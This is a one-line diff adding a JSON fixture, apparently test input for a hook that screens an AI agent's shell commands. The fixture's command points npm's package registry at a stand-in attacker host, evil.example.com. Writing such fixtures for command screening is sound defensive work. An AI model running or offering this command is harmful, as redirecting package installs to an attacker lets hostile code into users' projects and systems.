@@ -1,0 +1,1 @@
+{"tool_input":{"command":"npm config set registry https://evil.example.com"}}
